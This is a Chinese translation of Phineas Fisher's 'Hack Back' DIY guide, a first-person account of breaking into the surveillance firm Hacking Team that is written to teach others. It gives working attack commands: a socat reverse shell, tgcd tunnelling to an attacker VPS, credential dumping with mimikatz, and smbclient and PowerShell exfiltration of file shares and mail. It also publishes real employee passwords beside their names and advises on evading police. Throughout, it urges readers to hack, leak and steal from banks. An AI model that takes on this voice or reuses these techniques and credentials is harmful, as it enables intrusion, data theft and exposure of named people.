https://theanarchistlibrary.org/library/hack-back-subcowmandante-marcos-phineas-fisher-hack-back-a-diy-guide-hacking-team

**Hack Back, Subcowmandante Marcos, Phineas Fisher**

# Hack Back — 一份 DIY 指南（Hacking Team）

## 目录

1. 引言
2. Hacking Team
3. 保持安全
    - 加密硬盘
    - 使用所有流量经 Tor 路由的虚拟机
    - （可选）不要直接连接 Tor
    1. 基础设施
        1. 域名
        2. 稳定服务器
        3. 被攻陷的服务器
    2. 归因
4. 信息收集
    1. 技术信息
        1. Google
        2. 子域名枚举
        3. Whois 查询与反向查询
        4. 端口扫描与指纹识别
    2. 社会信息
        1. Google
        2. theHarvester 与 recon-ng
        3. LinkedIn
        4. Data.com
        5. 文件元数据
5. 进入网络
    1. 社会工程
    2. 购买访问权限
    3. 技术利用
6. 做好准备
    1. busybox
    2. nmap
    3. Responder.py
    4. Python
    5. tcpdump
    6. dsniff
    7. socat
    8. screen
    9. SOCKS 代理服务器
    10. tgcd
7. 观察与监听
8. NoSQL 数据库
9. 交叉的线缆
10. 从备份到域管理员
11. 下载邮件
12. 下载文件
13. Windows 域入侵入门
    1. 横向移动
        - 远程移动：
            1. psexec
            2. WMI
            3. PSRemoting
            4. 计划任务
            5. GPO
        - “就地”移动：
            1. 窃取令牌
            2. MS14-068
            3. Pass the Hash
            4. 进程注入
            5. runas
    2. 持久化
    3. 内部侦察
        1. 下载文件名列表
        2. 阅读邮件
        3. 阅读 SharePoint
        4. Active Directory
        5. 监视员工
14. 猎取系统管理员
15. 桥梁
16. 复用与重置密码
17. 结论
18. 联系方式

```text
                _   _            _      ____             _    _
               | | | | __ _  ___| | __ | __ )  __ _  ___| | _| |
               | |_| |/ _` |/ __| |/ / |  _ \ / _` |/ __| |/ / |
               |  _  | (_| | (__|   <  | |_) | (_| | (__|   <|_|
               |_| |_|\__,_|\___|_|\_\ |____/ \__,_|\___|_|\_(_)

                                  A DIY Guide

                                 ,-._,-._
                              _,-\  o O_/;
                             / ,  `     `|
                             | \-.,___,  /   `
                              \ `-.__/  /    ,.\
                             / `-.__.-\`   ./   \'
                            / /|    ___\ ,/      `\
                           ( ( |.-"`   '/\         \  `
                            \ \/      ,,  |          \ _
                             \|     o/o   /           \.
                              \        , /             /
                              ( __`;-;'__`)            \\
                              `//'`   `||`              `\
                             _//       ||           __   _   _ _____   __
                     .-"-._,(__)     .(__).-""-.      | | | | |_   _| |
                    /          \    /           \     | | |_| | | |   |
                    \          /    \           /     | |  _  | | |   |
                     `'-------`      `--------'`    __| |_| |_| |_|   |__
                               #antisec
```

## 1 — 引言

你会注意到，与上一版相比，语言变了[^1]。英语世界已经有大量关于黑客的书籍、演讲、指南和信息。在那个世界里，有很多比我更强的黑客，但他们把自己的才能误用于为“国防”承包商、情报机构工作，保护银行和企业，捍卫现状。黑客文化诞生于美国，是一种反文化，但这种起源只保留在美学层面——其余部分已被同化。至少他们可以穿 T 恤、把头发染蓝、使用自己的黑客名号，一边为当权者工作，一边觉得自己是反叛者。

过去，你得潜入办公室才能泄露文件[^2]；过去，你得有枪才能抢银行。现在，你躺在床上手持笔记本电脑就能同时做到这两件事[^3] [^4]。就像 CNT 在 Gamma Group 被黑后所说：“让我们用新的斗争形式向前迈进一步”[^5]。黑客技术是一种强大的工具，让我们学习并战斗！

## 2 — Hacking Team

Hacking Team 是一家帮助政府入侵并监视记者、活动人士、政治反对派以及其他对其权力构成威胁者的公司[^6] [^7] [^8] [^9] [^10] [^11] [^12] [^13] [^14] [^15] [^16]。偶尔，他们也会监视真正的罪犯和恐怖分子[^17]。其 CEO Vincenzetti 喜欢在邮件末尾加上法西斯口号“boia chi molla”。更准确的说法应该是“boia chi vende RCS”。他们还声称拥有解决 Tor 和暗网所构成“问题”的技术[^18]。但既然我仍然自由，我对它的有效性表示怀疑。

## 3 — 保持安全

不幸的是，我们的世界是颠倒的。你做坏事会发财，做好事却会坐牢。幸运的是，多亏了 Tor 项目[^19]等人员的辛勤工作，你可以通过采取一些简单的预防措施来避免坐牢：

1) 加密硬盘 [^20]

    > 我猜，当警察来扣押你的电脑时，意味着你已经犯了很多错误，但小心总归更好。

2) 使用所有流量经 Tor 路由的虚拟机

    > 这能实现两件事。第一，你的所有流量都通过 Tor 匿名化。第二，把个人生活和黑客活动放在不同电脑上，有助于避免意外混淆两者。

    > 你可以使用 Whonix [^21]、Tails [^22]、Qubes TorVM [^23] 等项目，或者自定义方案[^24]。这里[^25]有一份详细比较。

3) （可选）不要直接连接 Tor

    > Tor 并非万灵药。他们可以把你在连接 Tor 的时间与你的黑客代号活跃的时间进行关联。此外，也曾出现过针对 Tor 的成功攻击[^26]。你可以使用别人的 Wi-Fi 连接 Tor。Wifislax [^27] 是一个 Linux 发行版，包含大量破解 Wi-Fi 的工具。另一种选择是在 Tor 之前连接 VPN 或桥接节点[^28]，但这样安全性较低，因为他们仍可将黑客的活动与你家的互联网活动关联起来（这曾被用作对 Jeremy Hammond 不利的证据[^29]）。

    > 现实是，虽然 Tor 并不完美，但它运作得相当好。我年轻鲁莽时，除了 Tor 之外没有任何保护（我指的是黑客活动），做过不少事情，警方竭尽全力调查，而我从未遇到过问题。

### 3.1 — 基础设施

我不会直接从 Tor 出口节点发起黑客攻击。它们在黑名单上，速度慢，而且无法接收回连。Tor 在我连接用于黑客活动的基础设施时保护我的匿名性，这些基础设施包括：

1) 域名

    > 用于 `C&C` 地址，以及用于保证出网的 `DNS` 隧道。

2) 稳定服务器

    > 用作 `C&C` 服务器、接收回连 shell、发起攻击以及存放战利品。

3) 被攻陷的服务器

    > 用作跳板，以隐藏稳定服务器的 IP 地址；也用于在不想经过跳板时获得快速连接，例如扫描端口、扫描整个互联网、用 `sqli` 下载数据库等。

显然，你必须使用匿名支付方式，比如比特币（如果使用得当）。

### 3.2 — 归因

在新闻中，我们经常看到攻击被追溯到政府支持的黑客组织（“APT”），因为他们反复使用相同工具、留下相同足迹，甚至使用相同基础设施（域名、邮箱等）。他们之所以疏忽，是因为可以在没有法律后果的情况下进行黑客攻击。

我不想通过把我对 Hacking Team 的黑客行动与我做过的其他行动、或我作为黑帽黑客日常工作中使用的名字联系起来，让警方的工作变得更轻松。因此，我使用了新的服务器和域名，用新邮箱注册，并用新的比特币地址付款。此外，我只使用公开可用的工具，或专门为这次攻击编写的东西，并且改变了我做某些事情的方式，以免留下我惯常的取证痕迹。

## 4 — 信息收集

尽管可能很乏味，但这一阶段非常重要，因为攻击面越大，就越容易在其中某处找到漏洞。

### 4.1 — 技术信息

一些工具和技术包括：

1) Google

    > 通过几个精心选择的搜索查询，可以找到很多有趣的东西。例如 DPR 的身份[^30]。Google hacking 的圣经是《Google Hacking for Penetration Testers》一书。你可以在[^31]找到一份西班牙语简短摘要。

2) 子域名枚举

    > 通常，公司的主网站由第三方托管，而借助 `mx.company.com` 或 `ns1.company.com` 之类的子域名，你会找到公司实际的 IP 范围。此外，有时“隐藏”子域名中会存在本不应暴露的东西。用于发现域名和子域名的有用工具包括 `fierce` [^32]、`theHarvester` [^33] 和 `recon-ng` [^34]。

3) Whois 查询与反向查询

    > 利用公司某个域名或 IP 范围的 whois 信息进行反向查询，可以找到其他域名和 IP 范围。据我所知，除了 Google“hack”之外，没有免费的反向查询方式：

    ```text
    “via della moscova 13” site:www.findip-address.com
    “via della moscova 13” site:domaintools.com
    ```

4) 端口扫描与指纹识别

    > 与其他技术不同，这会与公司的服务器通信。我把它放在这一节，是因为它不是攻击，只是信息收集。公司的 IDS 可能会产生警报，但你不必担心，因为整个互联网一直在被扫描。

    > 扫描方面，`nmap` [^35] 很精确，并能对大多数发现的服务进行指纹识别。对于 IP 范围非常大的公司，`zmap` [^36] 或 `masscan` [^37] 速度很快。`WhatWeb` [^38] 或 `BlindElephant` [^39] 可以指纹识别网站。

### 4.2 — 社会信息

对于社会工程，掌握员工信息、他们的角色、联系方式、操作系统、浏览器、插件、软件等很有用。一些资源包括：

1) Google

    > 在这里，它同样是最有用的工具。

2) theHarvester 与 recon-ng

    > 我在上一节已经提到过它们，但它们还有更多功能。它们可以快速、自动地找到大量信息。值得阅读它们的全部文档。

3) LinkedIn

    > 在这里可以找到大量关于员工的信息。公司的招聘人员最有可能接受你的连接请求。

4) Data.com

    > 以前叫 `jigsaw`。他们拥有许多员工的联系信息。

5) 文件元数据

    > 公司已发布文件的元数据中，可以找到大量关于员工及其系统的信息。用于在公司网站上查找文件并提取元数据的有用工具是 `metagoofil` [^40] 和 `FOCA` [^41]。

## 5 — 进入网络

有多种方式可以获得立足点。由于我对 Hacking Team 使用的方法不常见，而且比通常所需的工作量大得多，我会稍微谈谈两种最常见的方式，我建议先尝试它们。

### 5.1 — 社会工程

社会工程，特别是鱼叉式钓鱼，是当今大多数黑客事件的元凶。西班牙语入门见[^42]。更多英语信息见[^43]（第三部分“Targeted Attacks”）。关于过去几代人的社会工程攻击趣事，见[^44]。我不想尝试对 Hacking Team 进行鱼叉式钓鱼，因为他们的整个业务就是帮助政府鱼叉式钓鱼其对手，所以他们更有可能识别并调查鱼叉式钓鱼企图。

### 5.2 — 购买访问权限

多亏了勤劳的俄罗斯人及其漏洞利用套件、流量卖家和僵尸网络牧养者，许多公司的网络中已经有被攻陷的计算机。几乎所有的《财富》500 强企业，凭借其庞大网络，内部都已经有一些僵尸程序。然而，Hacking Team 是一家非常小的公司，大多数员工都是信息安全专家，所以他们已经被攻陷的可能性很低。

### 5.3 — 技术利用

在 Gamma Group 被黑之后，我描述过一个寻找漏洞的过程[^45]。Hacking Team 有一个公网 IP 范围：

```log
inetnum:        93.62.139.32 — 93.62.139.47
descr:          HT public subnet
```

Hacking Team 暴露在互联网上的东西非常少。例如，与 Gamma Group 不同，他们的客户支持站点需要客户端证书才能连接。他们拥有的是主网站（一个 Joomla 博客，其中 `Joomscan`

## 6 — 做好准备

在对 Hacking Team 使用漏洞利用之前，我做了大量工作和测试。我编写了一个植入后门的固件，并为该嵌入式设备编译了各种后渗透工具。后门用于保护漏洞利用。只使用一次漏洞利用，然后通过后门返回，会使漏洞更难被识别和修补。

我准备的后渗透工具包括：

1) busybox

    > 用于提供系统缺少的所有标准 Unix 工具。

2) nmap

    > 用于扫描并指纹识别 Hacking Team 的内部网络。

3) Responder.py

    > 当你已能访问内部网络但没有域用户时，攻击 Windows 网络最有用的工具。

4) Python

    > 用于执行 `Responder.py`。

5) tcpdump

    > 用于嗅探流量。

6) dsniff

    > 用于从 `ftp` 等明文协议中嗅探密码，以及用于 `arpspoofing`。我想使用 Hacking Team 自己的 ALoR 和 NaGA 编写的 `ettercap`，但很难为该系统的环境编译它。

7) socat

    > 用于获得带 `pty` 的舒适 shell：

    ```sh
    my_server: socat file:‘tty‘,raw,echo=0 tcp-listen:my_port
    hacked box: socat exec:‘bash -li’,pty,stderr,setsid,sigint,sane \
           tcp:my_server:my_port
    ```

    > 它还有更多用途，是网络工具中的瑞士军刀。参见其文档的示例部分。

8) screen

    > 和带 `pty` 的 shell 一样，它并非真的必要，但我想在 Hacking Team 的网络里找到回家的感觉。

9) SOCKS 代理服务器

    > 配合 `proxychains` 使用，以便从任何程序访问他们的本地网络。

10) tgcd

    > 用于通过防火墙转发端口，例如为 `SOCKS` 服务器转发。

可能发生的最糟糕情况，是我的后门或后渗透工具使系统不稳定，导致员工进行调查。因此，在进入 Hacking Team 的网络之前，我花了一周时间在其他存在漏洞的公司的网络中测试我的漏洞利用、后门和后渗透工具。

## 7 — 观察与监听

现在进入他们的内部网络后，我想四处看看并思考下一步。我以分析模式启动 `Responder.py`（`-A` 用于监听但不发送中毒响应），并用 `nmap` 做了慢速扫描。

## 8 — NoSQL 数据库

NoSQL，或者更确切地说 NoAuthentication，一直是黑客社区的一份大礼[^60]。就在我担心他们终于修补了 MySQL 中所有身份验证绕过漏洞时[^61] [^62] [^63] [^64]，新的数据库流行起来，它们在设计上就缺乏身份验证。`nmap` 在 Hacking Team 的内部网络中发现了几个：

```log
27017/tcp open  mongodb       MongoDB 2.6.5
| mongodb-databases:
|   ok = 1
|   totalSizeMb = 47547
|   totalSize = 49856643072
...
|_    version = 2.6.5

27017/tcp open  mongodb       MongoDB 2.6.5
| mongodb-databases:
|   ok = 1
|   totalSizeMb = 31987
|   totalSize = 33540800512
|   databases
...
|_    version = 2.6.5
```

它们是 RCS 测试实例的数据库。RCS 录制的音频通过 `GridFS` 存储在 MongoDB 中。种子文件[^65]中的 audio 文件夹就来自这里。他们在无意中监视了自己。

## 9 — 交叉的线缆

虽然听录音、看 Hacking Team 开发恶意软件的网络摄像头图像很有趣，但并不很有用。他们不安全的备份才是打开大门的漏洞。根据他们的文档[^66]，他们的 `iSCSI` 设备本应位于单独网络中，但 `nmap` 在他们的子网 `192.168.1.200/24` 中发现了几台：

```log
Nmap scan report for ht-synology.hackingteam.local (192.168.200.66)
...
3260/tcp open  iscsi?
| iscsi-info:
|   Target: iqn.2000–01.com.synology:ht-synology.name
|     Address: 192.168.200.66:3260,0
|_    Authentication: No authentication required

Nmap scan report for synology-backup.hackingteam.local (192.168.200.72)
...
3260/tcp open  iscsi?
| iscsi-info:
|   Target: iqn.2000–01.com.synology:synology-backup.name
|     Address: 10.0.1.72:3260,0
|     Address: 192.168.200.72:3260,0
|_    Authentication: No authentication required
```

`iSCSI` 需要内核模块，为嵌入式系统编译它会很困难。我转发了端口，以便从 VPS 挂载它：

```sh
VPS: tgcd -L -p 3260 -q 42838
Embedded system: tgcd -C -s 192.168.200.72:3260 -c VPS_IP:42838

VPS: iscsiadm -m discovery -t sendtargets -p 127.0.0.1
```

现在 `iSCSI` 找到了名称 `iqn.2000–01.com.synology`，但在挂载时出现问题，因为它认为自己的 IP 是 `192.168.200.72`，而不是 `127.0.0.1`。

我的解决方式是：

```sh
iptables -t nat -A OUTPUT -d 192.168.200.72 -j DNAT --to-destination 127.0.0.1
```

然后，执行：

```sh
iscsiadm -m node --targetname=iqn.2000–01.com.synology:synology-backup.name -p 192.168.200.72 --login
```

设备文件出现了！我们挂载它：

```sh
vmfs-fuse -o ro /dev/sdb1 /mnt/tmp
```

并找到了多个虚拟机的备份。Exchange 服务器似乎最有趣。它太大，无法下载，但可以远程挂载以查找有趣文件：

```console
$ losetup /dev/loop0 Exchange.hackingteam.com-flat.vmdk
$ fdisk -l /dev/loop0
/dev/loop0p1            2048  1258287103   629142528    7  HPFS/NTFS/exFAT
```

所以偏移量是 `2048 * 512 = 1048576`。

```console
$ losetup -o 1048576 /dev/loop1 /dev/loop0
$ mount -o ro /dev/loop1 /mnt/exchange/
```

现在，在 `/mnt/exchange/WindowsImageBackup/EXCHANGE/Backup 2014-10-14 172311` 中，我们找到了该虚拟机的硬盘，并挂载它：

```sh
vdfuse -r -t VHD -f f0f78089-d28a-11e2-a92c-005056996a44.vhd /mnt/vhd-disk/
mount -o loop /mnt/vhd-disk/Partition1 /mnt/part1
```

……最后，我们拆开了俄罗斯套娃，可以在 `/mnt/part1` 中看到旧 Exchange 服务器的所有文件。

## 10 — 从备份到域管理员

备份中最让我感兴趣的是，看看其中是否有可用于访问在线服务器的密码或哈希。我在注册表配置单元上使用了 `pwdump`、`cachedump` 和 `lsadump` [^67]。`lsadump` 找到了 `besadmin` 服务账户的密码：

```log
_SC_BlackBerry MDS Connection Service
0000   16 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00    ................
0010   62 00 65 00 73 00 33 00 32 00 36 00 37 00 38 00    b.e.s.3.2.6.7.8.
0020   21 00 21 00 21 00 00 00 00 00 00 00 00 00 00 00    !.!.!...........
```

我在嵌入式设备上使用 `proxychains` [^68] 配合 socks 服务器，并用 `smbclient` [^69] 检查密码：

```sh
proxychains smbclient ‘//192.168.100.51/c$’ -U ‘hackingteam.local/besadmin%bes32678!!!’
```

成功了！`besadmin` 的密码仍然有效，而且它是本地管理员。我使用代理和 metasploit 的 `psexec_psh` [^70] 获得了一个 meterpreter 会话。然后我迁移到 64 位进程，运行“load kiwi”[^71]、“creds_wdigest”，获得了一堆密码，包括域管理员：

```log
HACKINGTEAM  BESAdmin       bes32678!!!
HACKINGTEAM  Administrator  uu8dd8ndd12!
HACKINGTEAM  c.pozzi        P4ssword      <---- 哈哈，好一个系统管理员
HACKINGTEAM  m.romeo        ioLK/(90
HACKINGTEAM  l.guerra       4luc@=.=
HACKINGTEAM  d.martinez     W4tudul3sp
HACKINGTEAM  g.russo        GCBr0s0705!
HACKINGTEAM  a.scarafile    Cd4432996111
HACKINGTEAM  r.viscardi     Ht2015!
HACKINGTEAM  a.mino         A!e$$andra
HACKINGTEAM  m.bettini      Ettore&Bella0314
HACKINGTEAM  m.luppi        Blackou7
HACKINGTEAM  s.gallucci     1S9i8m4o!
HACKINGTEAM  d.milan        set!dob66
HACKINGTEAM  w.furlan       Blu3.B3rry!
HACKINGTEAM  d.romualdi     Rd13136f@#
HACKINGTEAM  l.invernizzi   L0r3nz0123!
HACKINGTEAM  e.ciceri       2O2571&2E
HACKINGTEAM  e.rabe         erab@4HT!
```

## 11 — 下载邮件

有了域管理员密码，我就能访问邮件——公司的核心。由于我每走一步都有被发现的可能，所以在继续探索之前，我先开始下载他们的邮件。PowerShell 让这变得容易[^72]。奇怪的是，我发现了一个 PowerShell 日期处理方面的 bug。下载完邮件后，我又花了几周才获得源代码和其他所有内容的访问权限，所以我不时回来下载新邮件。服务器位于意大利，日期格式为日/月/年。我使用了：

```powershell
-ContentFilter {(Received -ge ’05/06/2015’) -or (Sent -ge ’05/06/2015’)}
```

配合 `New-MailboxExportRequest` 下载新邮件（在本例中是 6 月 5 日以来的所有邮件）。问题是，如果你尝试大于 12 的日期，它会说日期无效（我想是因为在美国月份在前，而月份不能大于 12）。看来微软的工程师只用他们自己的区域设置测试软件。

## 12 — 下载文件

现在我已经获得域管理员权限，我开始使用代理和 `smbclient` 的 `-Tc` 选项下载文件共享，例如：

```sh
proxychains smbclient ‘//192.168.1.230/FAE DiskStation’ \
    -U ‘HACKINGTEAM/Administrator%uu8dd8ndd12!’ -Tc FAE_DiskStation.tar ‘*’
```

我就是这样下载种子文件中 `Amministrazione`、`FAE DiskStation` 和 `FileServer` 文件夹的。

## 13 — Windows 域入侵入门

在继续讲“weones culiaos”（Hacking Team）的故事之前，我应该介绍一些入侵 Windows 网络的一般知识。

### 13.1 — 横向移动

我会简要回顾在 Windows 网络中扩散的不同技术。远程执行技术需要目标上本地管理员的密码或哈希。到目前为止，获取这些凭据最常见的方式是在你已拥有管理员权限的计算机上使用 `mimikatz` [^73]，尤其是 `sekurlsa::logonpasswords` 和 `sekurlsa::msv`。“就地”移动技术也需要管理员权限（`runas` 除外）。最重要的提权工具是 `PowerUp` [^74] 和 `bypassuac` [^75]。

#### 远程移动：

1) psexec

    > Windows 上久经考验的横向移动方法。你可以使用 `psexec` [^76]、`winexe` [^77]、metasploit 的 `psexec_psh` [^78]、Powershell Empire 的 `invoke_psexec` [^79]，或 Windows 内置命令 `sc` [^80]。对于 metasploit 模块、Powershell Empire 和 `pth-winexe` [^81]，你只需要哈希，不需要密码。它是最通用的方法（适用于任何开放 `445` 端口的 Windows 计算机），但也是最不隐蔽的。事件日志中会出现类型 `7045`“Service Control Manager”事件。根据我的经验，黑客攻击期间从未有人注意到，但它能帮助调查人员事后拼凑出黑客做了什么。

2) WMI

    > 最隐蔽的方法。`WMI` 服务在所有 Windows 计算机上都已启用，但除服务器外，防火墙默认阻止它。你可以使用 `wmiexec.py` [^82]、`pth-wmis` [^83]（这里有 `wmiexec` 和 `pth-wmis` 的演示[^84]）、Powershell Empire 的 `invoke_wmi` [^85]，或 Windows 内置的 `wmic` [^86]。除 `wmic` 外，都只需要哈希。

3) PSRemoting [^87]

    > 它默认禁用，我不建议启用新协议。但是，如果系统管理员已经启用了它，那就非常方便，尤其是如果你所有事情都用 PowerShell（而且你几乎应该所有事情都用 PowerShell；随着 PowerShell 5 和 Windows 10，情况会改变[^88]，但目前 PowerShell 让一切在 `RAM` 中完成、规避杀软并留下很小足迹变得很容易）。

4) 计划任务

    > 你可以用 `at` 和 `schtasks` [^80] 执行远程程序。它适用于你可以使用 `psexec` 的相同场景，而且也会留下众所周知的足迹[^89]。

5) GPO

    > 如果所有这些协议都被禁用或被防火墙阻止，一旦你成为域管理员，就可以使用 `GPO` 给用户登录脚本、安装 `msi`、执行计划任务[^13]，或者像我们将在 Mauro Romeo（Hacking Team 的系统管理员之一）的计算机上看到的那样，使用 `GPO` 启用 `WMI` 并打开防火墙。

#### “就地”移动：

1) 窃取令牌

    > 一旦你在某台计算机上拥有管理员权限，就可以使用其他用户的令牌访问域中的资源。两个做到这一点的工具是 `incognito` [^89] 和 `mimikatz` 的 `token::*` 命令[^90]。

2) MS14-068

    > 你可以利用 Kerberos 中的验证 bug 生成域管理员票据[^91] [^92] [^93]。

3) Pass the Hash

    > 如果你有用户的哈希，但该用户未登录，可以使用 `sekurlsa::pth` [^90] 获取该用户的票据。

4) 进程注入

    > 任何 RAT 都可以把自己注入其他进程。例如 meterpreter 和 `pupy` [^94] 中的 `migrate` 命令，或 Powershell Empire 中的 `psinject` [^95] 命令。你可以注入到拥有你所需令牌的进程中。

5) runas

    > 这有时非常有用，因为它不需要管理员权限。该命令是 Windows 的一部分，但如果你没有 GUI，可以使用 PowerShell [^96]。

### 13.2 — 持久化

一旦获得访问权限，你就想保持它。实际上，持久化只对像 Hacking Team 这样以活动人士和其他个人为目标的混蛋才是挑战。要黑公司，不需要持久化，因为公司从不睡觉。我总是使用 Duqu 2 风格的“持久化”，在几台高在线时长的服务器上于 `RAM` 中执行。万一它们同时重启，我有密码和黄金票据[^97]作为备用访问。你可以在这里阅读更多关于 Windows 中不同持久化技术的内容[^98] [^99] [^100]。但对于黑公司来说，它不必要，而且会增加被发现的风险。

### 13.3 — 内部侦察

如今理解 Windows 网络的最佳工具是 `Powerview` [^101]。值得阅读其作者写的所有内容[^102]，尤其是[^103]、[^104]、[^105]和[^106]。PowerShell 本身也相当强大[^107]。由于仍有许多没有 PowerShell 的 Windows 2000 和 2003 服务器，你还必须学习老派方法[^108]，使用 `netview.exe` [^109] 或 Windows 内置的 `net view` 等程序。其他我喜欢的技术包括：

1) 下载文件名列表

    > 使用域管理员账户，你可以用 `powerview` 下载网络中所有文件名的列表：

    ```powershell
    Invoke-ShareFinderThreaded -ExcludedShares IPC$,PRINT$,ADMIN$ |
    select-string ‘^(.*) \t-’ | %{dir -recurse $_.Matches[^0].Groups[^1] |
    select fullname | out-file -append files.txt}
    ```

    > 之后，你可以闲暇时阅读它，并选择要下载哪些文件。

2) 阅读邮件

    > 正如我们已经看到的，你可以用 PowerShell 下载邮件，其中有很多有用信息。

3) 阅读 SharePoint

    > 这是许多企业存储大量重要信息的另一个地方。它也可以用 PowerShell 下载[^110]。

4) Active Directory [^111]

    > 它包含大量关于用户和计算机的有用信息。即使不是域管理员，你也可以用 `powerview` 和其他工具[^112]获取很多信息。获得域管理员权限后，你应该用 `csvde` 或其他工具导出所有 AD 信息。

5) 监视员工

    > 我最喜欢的爱好之一是猎取系统管理员。监视 Christian Pozzi（Hacking Team 的系统管理员之一）让我访问了一台 Nagios 服务器，而这又让我访问了 `rete sviluppo`（包含 RCS 源代码的开发网络）。简单组合 PowerSploit 的 `Get-Keystrokes` 和 `Get-TimedScreenshot` [^113]、nishang 的 `Do-Exfiltration` [^114] 以及 `GPO`，你就可以监视任何员工，甚至整个域。

## 14 — 猎取系统管理员

阅读他们关于基础设施的文档[^115]时，我发现我仍然缺少对某个重要东西的访问——`Rete Sviluppo`，一个包含 RCS 源代码的隔离网络。公司的系统管理员总是能访问一切，所以我搜索了 Mauro Romeo 和 Christian Pozzi 的计算机，看看他们如何管理 Sviluppo 网络，以及是否还有其他我应该调查的有趣系统。访问他们的计算机很简单，因为他们属于我已经获得管理员权限的 Windows 域。Mauro Romeo 的计算机没有开放任何端口，所以我打开了 `WMI` 的端口[^116]并执行了 meterpreter [^117]。除了用 `Get-Keystrokes` 和 `Get-TimeScreenshot` 进行键盘记录和屏幕抓取外，我还使用了许多 metasploit 的 `/gather/` 模块、`CredMan.ps1` [^118]，并搜索了有趣的文件[^119]。看到 Pozzi 有一个 Truecrypt 卷后，我等到他挂载它，然后复制了文件。许多人嘲笑 Christian Pozzi 的弱密码（以及 Christian Pozzi 本人，他提供了大量素材[^120] [^121] [^122] [^123]）。我把它们包含在泄露数据中，作为假线索，也为了嘲笑他。现实是，`mimikatz` 和键盘记录器对所有密码一视同仁。

## 15 — 桥梁

在 Christian Pozzi 的 Truecrypt 卷中，有一个包含许多密码的文本文件[^124]。其中一个属于一台 Fully Automated Nagios 服务器，该服务器为了监控而可以访问 Sviluppo 网络。我找到了所需的桥梁。文本文件中只有 Web 界面的密码，但存在一个公开的代码执行漏洞[^125]（这是一个未认证漏洞，但它要求至少有一个用户已启动会话，为此我使用了文本文件中的密码）。

## 16 — 复用与重置密码

阅读邮件时，我看到 Daniele Milan 授予对 `git` 仓库的访问权限。多亏 `mimikatz`，我已经有了他的 Windows 密码。我在 `git` 服务器上尝试，成功了。然后我尝试 `sudo`，也成功了。对于 `gitlab` 服务器和他们的 Twitter 账户，我使用了“忘记密码”功能，并结合我对邮件服务器的访问来重置密码。

## 17 — 结论

这就是搞垮一家公司并制止其侵犯人权行为所需的全部。这就是黑客的美妙与不对称性：用 100 小时的工作，一个人就能抹去一家价值数百万美元公司多年的工作成果。黑客技术给了弱者战斗并获胜的机会。

黑客指南通常以免责声明结尾：此信息仅供教育目的，做一个有道德的黑客，不要攻击你未获授权攻击的系统，等等。我也会这么说，但对“道德”黑客有一种更具反叛性的理解。泄露文件、从银行征用资金、努力保护普通人的计算机，这些都是道德黑客。然而，大多数自称“道德黑客”的人，只是为那些支付高额咨询费的人提供安全保护，而这些人往往最该被黑。

Hacking Team 把自己视为一长串富有灵感的意大利设计的一部分[^126]。我把 Vincenzetti、他的公司、他在警察、Carabinieri 和政府中的亲信，视为意大利法西斯主义悠久传统的一部分。我想把这份指南献给 Armando Diaz 学校突袭事件的受害者，以及所有被意大利法西斯分子流血伤害的人。

## 18 — 联系方式

给我发送鱼叉式钓鱼尝试、意大利语死亡威胁[^127] [^128]，以及向我提供 `0day` 或银行、企业、政府等内部访问权限。

请只发加密邮件：[securityinabox.org](https://securityinabox.org/es/thunderbird_usarenigmail)

```text
-----BEGIN PGP PUBLIC KEY BLOCK-----

mQENBFVp37MBCACu0rMiDtOtn98NurHUPYyI3Fua+bmF2E7OUihTodv4F/N04KKx
vDZlhKfgeLVSns5oSimBKhv4Z2bzvvc1w/00JH7UTLcZNbt9WGxtLEs+C+jF9j2g
27QIfOJGLFhzYm2GYWIiKr88y95YLJxvrMNmJEDwonTECY68RNaoohjy/TcdWA8x
+fCM4OHxM4AwkqqbaAtqUwAJ3Wxr+Hr/3KV+UNV1lBPlGGVSnV+OA4m8XWaPE73h
VYMVbIkJzOXK9enaXyiGKL8LdOHonz5LaGraRousmiu8JCc6HwLHWJLrkcTI9lP8
Ms3gckaJ30JnPc/qGSaFqvl4pJbx/CK6CwqrABEBAAG0IEhhY2sgQmFjayEgPGhh
Y2tiYWNrQHJpc2V1cC5uZXQ+iQE3BBMBCgAhBQJXAvPFAhsDBQsJCAcDBRUKCQgL
BRYCAwEAAh4BAheAAAoJEDScPRHoqSXQoTwIAI8YFRdTptbyEl6Khk2h8+cr3tac
QdqVNDdp6nbP2rVPW+o3DeTNg0R+87NAlGWPg17VWxsYoa4ZwKHdD/tTNPk0Sldf
cQE+IBfSaO0084d6nvSYTpd6iWBvCgJ1iQQwCq0oTgROzDURvWZ6lwyTZ8XK1KF0
JCloCSnbXB8cCemXnQLZwjGvBVgQyaF49rHYn9+edsudn341oPB+7LK7l8vj5Pys
4eauRd/XzYqxqNzlQ5ea6MZuZZL9PX8eN2obJzGaK4qvxQ31uDh/YiP3MeBzFJX8
X2NYUOYWm3oxiGQohoAn//BVHtk2Xf7hxAY4bbDEQEoDLSPybZEXugzM6gC5AQ0E
VWnfswEIANaqa8fFyiiXYWJVizUsVGbjTTO7WfuNflg4F/q/HQBYfl4ne3edL2Ai
oHOGg0OMNuhNrs56eLRyB/6IjM3TCcfn074HL37eDT0Z9p+rbxPDPFOJAMFYyyjm
n5a6HfmctRzjEXccKFaqlwalhnRP6MRFZGKU6+x1nXbiW8sqGEH0a/VdCR3/CY5F
Pbvmhh894wOzivUlP86TwjWGxLu1kHFo7JDgp8YkRGsXv0mvFav70QXtHllxOAy9
WlBP72gPyiWQ/fSUuoM+WDrMZZ9ETt0j3Uwx0Wo42ZoOXmbAd2jgJXSI9+9e4YUo
jYYjoU4ZuX77iM3+VWW1J1xJujOXJ/sAEQEAAYkBHwQYAQIACQUCVWnfswIbDAAK
CRA0nD0R6Kkl0ArYB/47LnABkz/t6M1PwOFvDN3e2JNgS1QV2YpBdog1hQj6RiEA
OoeQKXTEYaymUwYXadSj7oCFRSyhYRvSMb4GZBa1bo8RxrrTVa0vZk8uA0DB1ZZR
LWvSR7nwcUkZglZCq3Jpmsy1VLjCrMC4hXnFeGi9AX1fh28RYHudh8pecnGKh+Gi
JKp0XtOqGF5NH/Zdgz6t+Z8U++vuwWQaubMJTRdMTGhaRv+jIzKOiO9YtPNamHRq
Mf2vA3oqf22vgWQbK1MOK/4Tp6MGg/VR2SaKAsqyAZC7l5TeoSPN5HdEgA7u5GpB
D0lLGUSkx24yD1sIAGEZ4B57VZNBS0az8HoQeF0k
=E5+y
-----END PGP PUBLIC KEY BLOCK-----
```

```text
                      If not you, who? If not now, when?
                _   _            _      ____             _    _
               | | | | __ _  ___| | __ | __ )  __ _  ___| | _| |
               | |_| |/ _` |/ __| |/ / |  _ \ / _` |/ __| |/ / |
               |  _  | (_| | (__|   <  | |_) | (_| | (__|   <|_|
